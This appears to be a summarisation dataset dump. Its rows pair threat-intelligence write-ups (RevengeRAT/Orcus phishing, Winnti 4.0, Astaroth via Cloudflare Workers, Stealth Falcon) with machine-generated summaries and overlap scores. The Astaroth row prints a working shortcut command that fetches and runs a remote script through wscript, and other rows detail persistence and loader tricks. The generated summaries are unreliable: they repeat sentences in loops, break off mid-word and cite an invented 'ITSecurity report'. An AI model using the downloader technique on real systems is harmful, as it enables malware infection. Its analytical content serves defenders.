obfuscation hex viewThis is a well-known technique as can be observed in the forum thread here.Later versions of the .bat downloader featured the use of obfuscation in an attempt to make analysis more difficult. They are using a simple obfuscation method and are just replacing all characters by variables that are resolved at runtime.Obfuscated RevengeRat .bat downloaderThe decoded version of the .bat file looks like this. Like in the non-obfuscated versions of the .bat file, the adversaries are downloading the .js file to a local directory (C:\windows\r2.js) and executing it.Decoded obfuscated .bat fileThis r2.js file is another obfuscated script. It is filled with a bunch of rubbish and one long line of code.Downloaded r2.js fileThis scripts writes the 'TVqQ...' string into the registry.r2.js payloadStored encoded malware in registry keyIt loads this string at the end of the infection process, decodes it and executes it.r2.js payload decoding routineDecompiling this payload in dnSpy shows an old friend: RevengeRAT.RevengeRAT decompiled binaryCommand and control (C2) obfuscationAs is the case with many popular RATs, the C2 infrastructure was observed leveraging Dynamic Domain Name System (DDNS) in an attempt to obfuscate the attacker's infrastructure. In the case of these malware campaigns, the attacker took an additional step. They pointed the DDNS over to the Portmap service to provide an additional layer of infrastructure obfuscation.Portmap is a service designed to facilitate external connectivity to systems that are behind firewalls or otherwise not directly exposed to the internet.Port forwarding serviceThese systems initiate an OpenVPN connection to the Portmap service, which is responsible for handling requests to those systems via port mapping. We have recently observed an increase in the volume of malicious attackers abusing this service to facilitate the C2 process across various malware families.HTTPS certificateAs demonstrated above, the DNS configuration for the DDNS hostname used by the malware for C2 has actually been pointed to the Portmap service. Let's Encrypt issued the SSL certificate associated with this host.Payload analysisThe adversaries used at least two different RATs in the campaigns which we have closely analyzed: Orcus RAT and RevengeRAT. For both RATs, the source code was leaked in the underground and several adversaries have used it to build their own versions. You can see the comparison of the leaked version of RevengeRAT and the one we analyzed below.Compairson leaked malware and modified oneThe adversaries changed the source code slightly. They moved the original code into separate functions and changed the execution order a bit plus added other minor changes like additional variables, but overall the code is still very similar to the leaked code. On the other hand, it is modified so that the resulting binary looks different for AVs.It is interesting to see that both (Client) IDs are pointing to the same name: CORREOS. In the Nuclear_Explosion file, aka RevengeRAT, it is only base64 encode ""Q09SUkVPUw=="".RevengeRAT Atomic class configOrcus decoded XML configConclusionThese malware distribution campaigns are ongoing and will likely continue to be observed targeting various organizations around the world. RevengeRAT and Orcus RAT are two of the most popular RATs in use across the threat landscape and will likely continue to be heavily favored for use during the initial stages of attacks.Organizations should leverage comprehensive defense-in-depth security controls to ensure that they are not adversely impacted by attacks featuring these malware families. At any given point in time, there are several unrelated attackers distributing these RATs in different ways. Given that the source code of both of these malware families is readily available, we will likely continue to see new variants of each of these RATs for the foreseeable future.CoverageAdditional ways our customers can detect and block this threat are listed below.Advanced Malware Protection (AMP) is ideally suited to prevent the execution of the malware used by these threat actors.Cisco Cloud Web Security (CWS) or Web Security Appliance (WSA) web scanning prevents access to malicious websites and detects malware used in these attacks.Email Security can block malicious emails sent by threat actors as part of their campaign.Network Security appliances such as Next-Generation Firewall (NGFW), Next-Generation Intrusion Prevention System (NGIPS), and Meraki MX can detect malicious activity associated with this threat.AMP Threat Grid helps identify malicious binaries and build protection into all Cisco Security products.Umbrella, our secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs, and URLs, whether users are on or off the corporate network.Open Source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org.Indicators of Compromise (IOCs)The following indicators of compromise (IOCs) have been observed to be associated with malware campaigns.ZIP Hashes (SHA256):c66c96c8c7f44d0fd0873ea5dbaaa00ae3c13953847f0ca308d1f56fd28f230cd6c5a75292ac3a6ea089b59c11b3bf2ad418998bee5ee3df808b1ec8955dcf2aBAT Hashes (SHA256):20702a8c4c5d74952fe0dc050025b9189bf055fcf6508987c975a96b7e5ad7f5946372419d28a9687f1d4371f22424c9df945e8a529149ef5e740189359f4c8dPE32 Hashes (SHA256):ff3e6d59845b65ad1c26730abd03a38079305363b25224209fe7f7362366c65e5e4db38933c0e3922f403821a07161623cd3521964e6424e272631c4492b8adeJS Hashes (SHA256):4c7d2efc19cde9dc7a1fcf2ac4b30a0e3cdc99d9879c6f5af70ae1b3a846b64bDomains:The following domains have been observed to be associated with malware campaigns:skymast231-001-site1[.]htempurl[.]comqstorm[.]chickenkiller[.]comIP Addresses:The following IP addresses have been observed to be associated with malware campaigns:193[.]161[.]193[.]99205[.]144[.]171[.]185";The ITSecurity report indicates that a malicious HTTP GET request is responsible for retrieving the malicious PE32 file and executing it, thus infecting the system. The malicious PE32 file is protected by the SmartAssembly .NET protector, but can easily be deobfuscated via d4dot. It extracts the malicious PE32 file from its Resource section and restores the original malicious PE32 file in memory in the 478768766.pdf.exe process context. The loader achieves persistence by creating a shortcut that points to its executable and storing the shortcut in the following Startup directory:C:\Users\<Username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup. The dropper also copies itself over to %APPDATA%\Roaming\trfgtf\rfgrf.exe and creates and starts the rfgrf.exe.bat file, which executes the copy of the loader every 60 seconds. The attached ZIP archives contain malicious batch files responsible for retrieving the malicious PE32 file and executing it, thus infecting the system. The malicious PE32 file is protected by the SmartAssembly .NET protector, but can easily be deobfuscated via d4dot. It extracts the malicious PE32 file from its Resource section and restores the original malicious PE32 file in memory in the 478768766.pdf.exe process context. The loader achieves persistence by creating a shortcut that points to its executable and storing the shortcut in the following Startup directory:C:\Users\<Username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup. The dropper also copies itself over to %APPDATA;en;{'r': 0.10947930574098798, 'p': 0.9318181818181818, 'f': 0.19593787147555775};{'r': 0.06860706860706861, 'p': 0.8181818181818182, 'f': 0.12659846404554032};{'r': 0.10947930574098798, 'p': 0.9318181818181818, 'f': 0.19593787147555775}
https://blog.talosintelligence.com/rat-ratatouille-revrat-orcus/;RAT Ratatouille: Backdooring PCs with leaked RATs;"Executive summaryOrcus RAT and RevengeRAT are two of the most popular remote access trojans (RATs) in use across the threat landscape. Since its emergence in 2016, various adversaries used RevengeRAT to attack organizations and individuals around the world. The source code associated with RevengeRAT was previously released to the public, allowing attackers to leverage it for their own malicious purposes. There are typically numerous, unrelated attackers attempting to leverage this RAT to compromise corporate networks for the purposes of establishing an initial point of network access, the performance of lateral movement, as well as to exfiltrate sensitive information that can be monetized. Orcus RAT was in the news earlier this year due to Canadian law enforcement activity related to the individual believed to have authored the malware.Cisco Talos recently discovered a threat actor that has been leveraging RevengeRAT and Orcus RAT in various malware distribution campaigns targeting organizations including government entities, financial services organizations, information technology service providers and consultancies. We discovered several unique tactics, techniques, and procedures (TTPs) associated with these campaigns including the use of persistence techniques most commonly associated with ""fileless"" malware, obfuscation techniques designed to mask C2 infrastructure, as well as evasion designed to circumvent analysis by automated analysis platforms such as malware sandboxes.The characteristics associated with these campaigns evolved over time, showing the attacker is constantly changing their tactics in an attempt to maximize their ability to infect corporate systems and work toward the achievement of their longer-term objectives.Malicious email campaignsThere have been several variations of the infection process associated with these malware distribution campaigns over time. In general, the emails in every case claim to be associated with complaints against the organization being targeted. They purport to be from various authorities such as the Better Business Bureau (BBB). Below is an example of one of these emails:Phishing emailIn addition to Better Business Bureau, Talos has also observed emails purporting to be associated with other entities such as Australian Competition & Consumer Commission (ACCC), Ministry of Business Innovation & Employment (MBIE) and other regional agencies.Earlier malware campaigns contained a hyperlink that directed potential victims to the malicious content responsible for initiating the malware infection. The attacker made use of the SendGrid email delivery service to redirect victims to an attacker-controlled malware distribution server.The link in one example email was pointed to the following SendGrid URL:https://u12047697[.]ct[.]sendgrid[.]net/wf/click?upn=X2vR6-2FdIf8y2XI902U8Tc8qh9KOPBogeTLss4h7AKXe0xRjCQw1VcMTssPPPTU28KY7PwUPERvVvIa8n4VQD-2Fw-3D-3D_tIiqtngjMfK6xwiZyGxyMuaZ5weLruJKBoFJsVrKYBziY2h51ElcQ2ocLru0oJCxt-2FOlkcr6RH8ktqTc-2B-2BQjmMscOQaeiy2zw8OOUb6nD0f1srQnQG-2B-2BIXtpubqjWMnnIHxJg3TvgFRq0itu75WQHjsdUv1O1g-2FrQzQAyJkGQN6vC9fH5R4R4FyLG9ahUnvbnHt-2FEmdUJQuft0jfw2c5uPBA2M5Yspgi-2Fodr8cEU2b8-3DThis URL is responsible for redirecting the client to a URL hosted on an attacker-controlled server that hosts a ZIP archive containing the malicious PE32 used to infect the system. Below, you can see the HTTP GET request that is responsible for retrieving this and continuing the infection process.ZIP File downloadA PE32 executable is inside of the ZIP archive. It needs to be executed by the victim to infect the system with Orcus RAT. The PE32 filename features the use of double extensions (478768766.pdf.exe) which, by default on the Windows operating system, will only display the first extension (.PDF.) The PE32 icon has been set to make the file appear as if it is associated with Adobe AcrobatDouble extensions trickThis loader (478768766.pdf.exe) is protected by the SmartAssembly .NET protector (see below), but can easily be deobfuscated via d4dot. It is responsible for extracting and decrypting the Orcus RAT. It extracts the Orcus executable from its Resource ""???????"" as shown in the screenshots below.Orcus loader resourcesThe Class5.smethod_1 method, shown in the screenshot below, decodes the content from the resource section and restores the original Orcus RAT PE file.Resource section payload decodingThe smethod_3 shown below finally starts another instance of the loader (478768766.pdf.exe) and injects the Orcus PE file into this loader process. Then it resumes the process, which executes the Orcus RAT PE file in memory in the 478768766.pdf.exe process context. This means the original Orcus RAT PE file is never written to disk in clear text. This makes it more difficult for anti virus systems to detect it.Process injection methodThe loader achieves persistence by creating a shortcut that points to its executable and storing the shortcut in the following Startup directory:C:\Users\<Username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\StartupThe dropper also copies itself over to %APPDATA%\Roaming\trfgtf\rfgrf.exe and creates and starts the rfgrf.exe.bat file, which you can see below. The bat file executes the copy of the loader every 60 seconds.rfgrf.exe.batIn later campaigns, the adversary modified the infection process and emails no longer leveraged the SendGrid URLs. Later emails featured the same themes and verbiage but were modified to contain ZIP archive attachments.Phishing emailThe attached ZIP archives contain malicious batch files responsible for retrieving the malicious PE32 file and executing it, thus infecting the system. Early versions of the batch file retrieved additional malicious content from the same server previously used to host the ZIP archives.Malicious .bat downloaderOne interesting thing to note about the batch files was the use of an obfuscation technique that is not commonly seen. In early campaigns, the attacker prepended the bytes ""FF FE 26 63 6C 73 0D 0A"" into the file, causing various file parsers to interpret the file contents as UTF-16 LE, resulting in the parsers failing to properly display the contents of the batch file.Unicode obfuscation standard editorThe hex view of the same file shows these prepended bytes which are responsible for this parsing issue.Unicode obfuscation hex viewThis is a well-known technique as can be observed in the forum thread here.Later versions of the .bat downloader featured the use of obfuscation in an attempt to make analysis more difficult. They are using a simple obfuscation method and are just replacing all characters by variables that are resolved at runtime.Obfuscated RevengeRat .bat downloaderThe decoded version of the .bat file looks like this. Like in the non-obfuscated versions of the .bat file, the adversaries are downloading the .js file to a local directory (C:\windows\r2.js) and executing it.Decoded obfuscated .bat fileThis r2.js file is another obfuscated script. It is filled with a bunch of rubbish and one long line of code.Downloaded r2.js fileThis scripts writes the 'TVqQ...' string into the registry.r2.js payloadStored encoded malware in registry keyIt loads this string at the end of the infection process, decodes it and executes it.r2.js payload decoding routineDecompiling this payload in dnSpy shows an old friend: RevengeRAT.RevengeRAT decompiled binaryCommand and control (C2) obfuscationAs is the case with many popular RATs, the C2 infrastructure was observed leveraging Dynamic Domain Name System (DDNS) in an attempt to obfuscate the attacker's infrastructure. In the case of these malware campaigns, the attacker took an additional step. They pointed the DDNS over to the Portmap service to provide an additional layer of infrastructure obfuscation.Portmap is a service designed to facilitate external connectivity to systems that are behind firewalls or otherwise not directly exposed to the internet.Port forwarding serviceThese systems initiate an OpenVPN connection to the Portmap service, which is responsible for handling requests to those systems via port mapping. We have recently observed an increase in the volume of malicious attackers abusing this service to facilitate the C2 process across various malware families.HTTPS certificateAs demonstrated above, the DNS configuration for the DDNS hostname used by the malware for C2 has actually been pointed to the Portmap service. Let's Encrypt issued the SSL certificate associated with this host.Payload analysisThe adversaries used at least two different RATs in the campaigns which we have closely analyzed: Orcus RAT and RevengeRAT. For both RATs, the source code was leaked in the underground and several adversaries have used it to build their own versions. You can see the comparison of the leaked version of RevengeRAT and the one we analyzed below.Compairson leaked malware and modified oneThe adversaries changed the source code slightly. They moved the original code into separate functions and changed the execution order a bit plus added other minor changes like additional variables, but overall the code is still very similar to the leaked code. On the other hand, it is modified so that the resulting binary looks different for AVs.It is interesting to see that both (Client) IDs are pointing to the same name: CORREOS. In the Nuclear_Explosion file, aka RevengeRAT, it is only base64 encode ""Q09SUkVPUw=="".RevengeRAT Atomic class configOrcus decoded XML configConclusionThese malware distribution campaigns are ongoing and will likely continue to be observed targeting various organizations around the world. RevengeRAT and Orcus RAT are two of the most popular RATs in use across the threat landscape and will likely continue to be heavily favored for use during the initial stages of attacks.Organizations should leverage comprehensive defense-in-depth security controls to ensure that they are not adversely impacted by attacks featuring these malware families. At any given point in time, there are several unrelated attackers distributing these RATs in different ways. Given that the source code of both of these malware families is readily available, we will likely continue to see new variants of each of these RATs for the foreseeable future.CoverageAdditional ways our customers can detect and block this threat are listed below.Advanced Malware Protection (AMP) is ideally suited to prevent the execution of the malware used by these threat actors.Cisco Cloud Web Security (CWS) or Web Security Appliance (WSA) web scanning prevents access to malicious websites and detects malware used in these attacks.Email Security can block malicious emails sent by threat actors as part of their campaign.Network Security appliances such as Next-Generation Firewall (NGFW), Next-Generation Intrusion Prevention System (NGIPS), and Meraki MX can detect malicious activity associated with this threat.AMP Threat Grid helps identify malicious binaries and build protection into all Cisco Security products.Umbrella, our secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs, and URLs, whether users are on or off the corporate network.Open Source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org.Indicators of Compromise (IOCs)The following indicators of compromise (IOCs) have been observed to be associated with malware campaigns.ZIP Hashes (SHA256):c66c96c8c7f44d0fd0873ea5dbaaa00ae3c13953847f0ca308d1f56fd28f230cd6c5a75292ac3a6ea089b59c11b3bf2ad418998bee5ee3df808b1ec8955dcf2aBAT Hashes (SHA256):20702a8c4c5d74952fe0dc050025b9189bf055fcf6508987c975a96b7e5ad7f5946372419d28a9687f1d4371f22424c9df945e8a529149ef5e740189359f4c8dPE32 Hashes (SHA256):ff3e6d59845b65ad1c26730abd03a38079305363b25224209fe7f7362366c65e5e4db38933c0e3922f403821a07161623cd3521964e6424e272631c4492b8adeJS Hashes (SHA256):4c7d2efc19cde9dc7a1fcf2ac4b30a0e3cdc99d9879c6f5af70ae1b3a846b64bDomains:The following domains have been observed to be associated with malware campaigns:skymast231-001-site1[.]htempurl[.]comqstorm[.]chickenkiller[.]comIP Addresses:The following IP addresses have been observed to be associated with malware campaigns:193[.]161[.]193[.]99205[.]144[.]171[.]185";The ITSecurity report indicates that a malicious HTTP GET request is responsible for retrieving the malicious PE32 file and executing it, thus infecting the system. The malicious PE32 file is protected by the SmartAssembly .NET protector, but can easily be deobfuscated via d4dot. It extracts the malicious PE32 file from its Resource section and restores the original malicious PE32 file in memory in the 478768766.pdf.exe process context. The loader achieves persistence by creating a shortcut that points to its executable and storing the shortcut in the following Startup directory:C:\Users\<Username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup. The dropper also copies itself over to %APPDATA%\Roaming\trfgtf\rfgrf.exe and creates and starts the rfgrf.exe.bat file, which executes the copy of the loader every 60 seconds. The attached ZIP archives contain malicious batch files responsible for retrieving the malicious PE32 file and executing it, thus infecting the system. The malicious PE32 file is protected by the SmartAssembly .NET protector, but can easily be deobfuscated via d4dot. It extracts the malicious PE32 file from its Resource section and restores the original malicious PE32 file in memory in the 478768766.pdf.exe process context. The loader achieves persistence by creating a shortcut that points to its executable and storing the shortcut in the following Startup directory:C:\Users\<Username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup. The dropper also copies itself over to %APPDATA;en;{'r': 0.10947930574098798, 'p': 0.9318181818181818, 'f': 0.19593787147555775};{'r': 0.06860706860706861, 'p': 0.8181818181818182, 'f': 0.12659846404554032};{'r': 0.10947930574098798, 'p': 0.9318181818181818, 'f': 0.19593787147555775}
https://blogs.vmware.com/security/2019/09/cb-tau-threat-intelligence-notification-winnti-malware-4-0.html;CB TAU Threat Intelligence Notification: Winnti Malware 4.0;"Winnti is a family of malware used by multiple Chinese threat actors like APT41. Carbon Black's Threat Analysis Unit (TAU) is providing this technical analysis, YARA rules, IOCs and product rules for the research community.Behavioral SummaryWinnti malware is installed manually with stolen privileged credentials or by exploiting system vulnerabilities since it requires an AES key string to decrypt a DAT file.CB Threat Hunter will show the natural progression of this malware execution.Additionally CB Defense will display TTPs created by the malware.If you are a Carbon Black customer looking to learn how to defend against this attack, click here.Technical AnalysisWinnti Analysis HistoryWinnti malware has been analyzed by several security vendors dating back to at least 2013.2013Kaspersky reported Winnti version 1.0-2.0.2015Novetta analyzed the start-up sequence and C2 protocol of version 3.0 in detail.2016Symantec presented at HITCON 2016 about version 3.0 server variants with NDIS kernel rootkits for covert communication channels.2017Some Winnti samples decoding C2 address strings on legitimate websites were observed (e.g., PlugX-like encoded strings on GitHub reported by TrendMicro, Base58 and XOR encoded strings on Google+).2018TKCERT released the code and Nmap script to detect version 3.0 server variant infections based on the unique packets handled by the kernel rootkits.2019Chronicle documented Winnti Linux variants.Recent Variants Since 2016TAU observed that the recent implementation (especially the start-up sequence) have changed from version 3.0. In public presentations, Macnica Networks first described the new variants at JSAC 2018. Here we refer to the variants as version 4.0 to differentiate from other previous versions.The differences from version 3.0 are below:version 3.0 version 4.0 initial component dropper loader and DAT file initial encryption algorithm DES AES initial encryption key cracking easy hard worker encryption 1 byte XOR and nibble swap DPAPI or AES with host-specific keyAES encryption for 4.0 DAT fileThe Winnti 4.0 variants require a command line structured in the manner listed in the table below, in order to fully execute.loader_path AES_key_string DAT_file_pathThe loader requires two arguments:An AES key string The file path whose extension is "" dat""The DAT file is encrypted using AES in CTR mode (the initial counter value is an integer value of ""q@3$%hy*&u"" in little endian).The third party library libtomcrypt is used for the decryption. The library is also utilized for decrypting other hack tools like AceHash. By creating Yara rules which focus on the code sequences utilizing libtomcrypt, researchers can hunt for these and other related samples using this library.Some loader samples decrypt an inline DLL with the same encryption method and key then create a rundll32 process with the following arguments.[pattern1] ""the_decrypted_DLL_path"", setup AES_key|dat_file_path|self_path [pattern2] ""the_decrypted_DLL_path"", run self_path AES_key dat_file_pathOne of the decrypted DLLs decodes the inline shellcode/DLL with XOR then runs the shellcode which is the same as the PlugX Type I LdrLoadShellcode function. The role of the DLL is UAC bypass by using the IARPUninstallStringLauncher COM object.Other loader samples directly decrypt and run a DAT file. In this case, the dropper calls the PlugX Type I shellcode decrypted from the DAT file then the shellcode extracts an inline payload to call the entrypoint.DAT Payload BehaviorIn regards to the decrypted DAT payload behavior, we introduce the following two sample cases compiled in 2017 and 2018. The Winnti 4.0 variants utilize DPAPI (Data Protection API) for worker metadata/component encryptions. DPAPI is available as a built-in component in Windows and the encryption keys are generated based on secrets in the system such as user passwords. This makes the decryption more difficult unless you have additional context about the sample's acquisition location.Macnica also reported that worker components were encrypted with host-specific AES keys, which are generated from computer name and ProductId from the registry.2017 Sample CaseThe DAT payload contains service and worker components. The payload encrypts the inline worker component by using CryptProtectData API then copies the encrypted worker into the service component. The specific GUID 66C56AF7-A572-4E08-B421-7A453CA2D372 is used to search the destination offset. After that, the service component is saved to the system.The payload also adds a new IAT entry to wbemcomn.dll (specified in a configuration block) to load the service component for persistence. The technique is the same as that used by Winnti ""VSEC variants"" in Symantec presentation referenced above.The service component just decrypts the inline worker component by using CryptUnprotectData API then calls the entrypoint. The worker code is most similar to version 3.0 except where decoding C2 address strings included in legitimate websites. The configuration block contains a GitHub URL for the decoding, which appears to be one of variants previously reported by Trendmicro.2018 Sample CaseThe payload saves service and DPAPI-encrypted worker components as separated files. The persistence for the service component is set by registering a new service. The worker component code has less than 50% similarity with the 2017 sample and the C2 protocol had been changed from version 3.0. The worker configuration block structure is detailed below:struct __unaligned __declspec(align(2)) struc_work_config { char campaignID[64], char MAC_addr[6], int c2_proto, char c2_host_port[128], char c2_active_table[672], struc_proxy proxy, struc_server_ports server_ports, int httpapi_mode_imm4, int httpapi_proto, int httpapi_port, int field_56A, int field_56E, int field_572, int field_576, int field_57A, int field_57E, wchar_t httpapi_url[256], char field_782[16], int server_cert_size, int server_privkey_size, char server_cert_der[655], // flexible according to the size char server_privkey_der[609], // flexible according to the size char padding[2832], }, struct struc_proxy { int proxy_proto, char proxy_host[256], char proxy_user[64], char proxy_pass[32], char proxy_realm[128], }, struct struc_server_ports { __int16 tcp, __int16 udp, __int16 unk, __int16 unk_0, __int16 unk_1, __int16 http, __int16 https, __int16 tls, }, enum enum_proto // specified by c2_proto and proxy_proto values { none = 0x0, TCP = 0x1, HTTP = 0x2, HTTPS = 0x3, TLS = 0x4, UDP = 0x5, },As the structure shows, it supports TCP/HTTP/HTTPS/TLS/UDP including a server mode. The latest C2 protocol will be detailed in a later report.Wrap-upWinnti malware 4.0 is carefully implemented to make the worker code acquisition harder. This is why there is limited public information about this variant even though it was first observed in 2016. Our hope is that practitioners and researchers will continue to focus on this malware and the threat actors using it.MITRE ATT&CK TIDsTID Tactic Description T1050 Persistence, Privilege Escalation Service Registry Permissions Weakness T1058 Persistence, Privilege Escalation New Service T1045 Defense Evasion Software Packing T1112 Defense Evasion Modify Registry T1057 Discovery Process Discovery T1071 Command And Control Standard Application Layer Protocol T1032 Command And Control Standard Cryptographic Protocol T1094 Command And Control Custom Command and Control Protocol T1024 Command And Control Custom Cryptographic Protocol T1095 Command And Control Standard Non-Application Layer Protocol T1085 Defense Evasion, Execution Rundll32 T1038 Persistence, Privilege Escalation, Defense Evasion DLL Search Order Hijacking T1088 Defense Evasion, Privilege Escalation Bypass User Account Control T1099 Defense Evasion Timestomp T1002 Exfiltration Data Compressed T1022 Exfiltration Data EncryptedYARA RulesThe rules are available publically here.Indicators of Compromise (IOCs)";The Winnti 4.0 malware variant uses Data Protection API (DPAPI) for worker metadata/component encryptions. DPAPI is available as a builtin component in Windows and the encryption keys are generated based on secrets in the system such as user passwords. This makes the decryption more difficult unless you have additional context about the sample's acquisition location. Winnti malware 4.0 is carefully implemented to make the worker code acquisition harder. This is why there is limited public information about this variant even though it was first observed in 2016. Our hope is that practitioners and researchers will continue to focus on this malware and the threat actors using it. The Winnti 4.0 malware variant uses Data Protection API (DPAPI) for worker metadata/component encryptions. DPAPI is available as a builtin component in Windows and the encryption keys are generated based on secrets in the system such as user passwords. This makes the decryption more difficult unless you have additional context about the sample's acquisition location. Winnti malware 4.0 is carefully implemented to make the worker code acquisition harder. This is why there is limited public information about this variant even though it was first observed in 2016. Our hope is that practitioners and researchers will continue to focus on this malware and the threat actors using it. The Winnti 4.0 malware variant uses Data Protection API (DPAPI) for worker metadata/component encryptions. DPAPI is available as a builtin component in Windows and the encryption keys are generated based on secrets in the system such as user passwords. This makes the decryption more difficult unless you have additional context about the sample's acquisition location. Winnti malware 4.0 is;en;{'r': 0.13541666666666666, 'p': 0.9629629629629629, 'f': 0.23744292021267285};{'r': 0.09251968503937008, 'p': 0.8785046728971962, 'f': 0.1674087249010688};{'r': 0.13541666666666666, 'p': 0.9629629629629629, 'f': 0.23744292021267285}
https://medium.com/@marcelx/threat-actor-behind-astaroth-is-now-using-cloudflare-workers-to-bypass-your-security-solutions-2c658d08f4c;Threat Actor behind Astaroth is using Cloudflare Workers to bypass your Security Solutions.;"To generate the second stage of the attack, the JSON from the URL is parsed, converted from Base64 to Array buffer, written to browser's blob storage, renamed to match to the name of the HTML file, a link is created and auto clicked to download it to user's browser.What the download looks like in Chrome.Second stage:The second stage starts with a zip file which was just created based on the data from the URL. This method of file creation has few advantages versus just statically downloading a zip file.1. Threat actor can create different files for different target and serving it via one endpoint.2. The network traffic might block downloading file objects, but JSON is a natural part of the web and would never be blocked.3. Some security solution vendors can identify file object on traffic of the network and send that for analysis. This would jeopardize the operation fairly fast and IOCs can be distributed across the world in no time.The zipped file contains a shortcut with a modified target and Icon.Totally legitimate-looking shortcut!%ComSpec% /c ""echo GetObject(""script:hxxps://xsw%RANDOM%nnccccmd95c22[.]cloudflareworkers[.]com/.edgeworker-fiddle-init-preview/6a8db783ccc67c314de2767f33605caec2262527cbed408b4315c2e2d54cf0371proud-glade-92ec.ativadormasterplus.workers.dev/?09/"")"" > %temp%\Lqncxmm:vbvvjjh.js && start wscript.exe %temp%\Lqncxmm:vbvvjjh.js""Let's dissect.While it's less commonly known or used but ""%ComSpec%"" is a pre-assigned environment variable that, by default, stores the ""cmd.exe"" absolute path and dates back to the stone ages.Next, we have the GetObject VBA function with a link to WScript file to download and run from the temp folder. But pay attention to the URL again, there is %RANDOM% command in the URL. %RANDOM% is a built-in variable in Windows CMD shell that generates a random integer from 0 to 32,767. Since the URL has echo wrapped around it, the random variable is successfully replaced with valid numbers and passed to CMD to execute the GetObject command. This leads to generating an almost unlimited number of URLs based on that random variable returns. To understand how this is working, we need to understand how Cloudflare Workers work.By everyone, they mean threat actors as well.Cloudflare Workers derive their name from Web Workers, and more specifically Service Workers, the W3C standard API for scripts that run in the background in a web browser and intercept HTTP requests. Cloudflare Workers are written against the same standard API but run on Cloudflare's servers, not in a browser. Cloudflare Workers lets you run JavaScript in Cloudflare's hundreds of data centers around the world. Using a Worker, one can do a number of things, including:Load balance between multiple origins to improve speed or reliability.Render HTML templates while fetching dynamic content from your origin.Dynamically respond to requests without needing to connect to an origin server at all.Generate parallel requests to different services and combine the responses.Create custom security rules and filters to block unwanted visitors and bots.Perform data sanitation and validation before sending a request to origin.Actions happen inside Cloudflare's lightning-fast edge network.All and all, Cloudflare Workers' introduces a great resilient platform to the threat actors without the need for them to maintain infrastructure. Cloudflare.Workers has a free plan which anyone or anything can sign up and get 100,000 total requests per day. You can create unlimited number of workers per account.But you might still be asking how did that the URL with a random number as subdomain was created?Cloudflare Workers dashboard has script editor feature which gives the developers option to write and preview script before deploying to their network. It's something of a jsfiddle.net if you wish. The preview fiddle renders the script on a different hostname every time the script is run, except it's not one. It's a virtual one created based on the incoming request and the Workers name given to it.Let me show you an example:Here I have a free worker which is running a simple script to just return ""Hello World"" as the page content. There is a preview panel on the side that display the changes I make when I press run.Workers Script EditorThis is the general flow that Cloudflare Script editor uses to preview the changes:The preview panel is not run from the Workers ID address. if you open up Chrome's network panel, you would see the response is coming from a different hostname every time.First run.The first run involves making a GET request tohttps://84efc29573641d2f04337907900ab249.cloudflareworkers.com/.edgeworker-fiddle-init-preview/ae634c73683563b82196ddb468eede951636ba7051b2f5171ba2ae69ae94b17b1muddy-surf-5e18.marcel.workers.dev/which after settings a cookie, redirects tohttps://84efc29573641d2f04337907900ab249.cloudflareworkers.comSecond run.Like the first run, the second run is making a GET request tohttps://327559932d6dbe26a9d576034fd615d2.cloudflareworkers.com/.edgeworker-fiddle-init-preview/ae634c73683563b82196ddb468eede951636ba7051b2f5171ba2ae69ae94b17b1muddy-surf-5e18.marcel.workers.dev/with redirects tohttps://327559932d6dbe26a9d576034fd615d2.cloudflareworkers.comNow if I make an arbitrary change in the Workers name in the first GET request URL, the response would still be the same. Here I replaced the first 5 digits with 12345 and the redirected shows the same content.voila!Potentially this can produce a large or unlimited number of the hostname that can execute particular code which traditional Anti-bot or blocking tools will fail to catch. Cloudflare Workers do not have the capability to host file but it can redirect traffic from its Workers to a static file hosting server without revealing its identity. Cloudflare documentations even provide an example:Remember the shortcut? you can replace the RANDOM with any digits or letters you end up with a preview URL which drops script file.hxxps://xsw12345nnccccmd95c22[.]cloudflareworkers[.]com/.edgeworker-fiddle-init-preview/6a8db783ccc67c314de2767f33605caec2262527cbed408b4315c2e2d54cf0371proud-glade-92ec.ativadormasterplus.workers.devThird Stage:The script file is saved into temp\ Lqncxmm:vbvvjjh.js and executed with Windows Script Host (Wscript) process. You can see how the threat actor uses the feature of Cloudflare to their advantage. The authors have added a simple random number generator and essentially randomize the URL that will download third stage payload.such a simple functionThe simple function above will generate a random number based on the parameter given to it. For the third stage, there are ten randomized and unique Cloudflare Worker node links they use a random number between 20000 to 50000, twice for each link. So just one link would have 900 million variations. I'll let you do the calculation on how many traditional IOCs you would obtain from just a simple script.";The ITSecurity report states that Cloudflare Workers can be used to create unlimited number of workers per account. However, this can potentially produce a large or unlimited number of the hostname that can execute particular code which traditional Antibot or blocking tools will fail to catch. Cloudflare Workers do not have the capability to host file but it can redirect traffic from its Workers to a static file hosting server without revealing its identity. Cloudflare documentations even provide an example: Remember the shortcut? You can replace the RANDOM with any digits or letters you end up with a preview URL which drops script file. hxxps://xsw12345nnccccmd95c22[.]cloudflareworkers[. ]com/.edgeworkerfiddleinitpreview/6a8db783ccc67c314de2767f33605caec2262527cbed408b4315c2e2d54cf0371proudglade92ec.ativadormasterplus.workers.dev;en;{'r': 0.1492842535787321, 'p': 0.8795180722891566, 'f': 0.255244752763766};{'r': 0.09378407851690294, 'p': 0.8037383177570093, 'f': 0.1679687481285286};{'r': 0.1492842535787321, 'p': 0.8795180722891566, 'f': 0.255244752763766}
https://www.welivesecurity.com/2019/09/09/backdoor-stealth-falcon-group/;ESET discovered an undocumented backdoor used by the infamous Stealth Falcon group;"ESET researchers discovered a backdoor linked to malware used by the Stealth Falcon group, an operator of targeted spyware attacks against journalists, activists and dissidents in the Middle EastStealth Falcon is a threat group, active since 2012, that targets political activists and journalists in the Middle East. It has been tracked by the Citizen Lab, a non-profit organization focusing on security and human rights, which published an analysis of a particular cyberattack in 2016. In January of 2019, Reuters published an investigative report into Project Raven, an initiative allegedly employing former NSA operatives and aiming at the same types of targets as Stealth Falcon.Based on these two reports referring to the same targets and attacks, Amnesty International's Senior Technologist, Claudio Guarnieri, has concluded that Stealth Falcon and Project Raven actually are the same group.Some technical information about Stealth Falcon has already been made public - notably, in the already mentioned analysis by the Citizen Lab.The key component in the attack documented in the Citizen Lab report was a PowerShell-based backdoor, delivered via a weaponized document that was 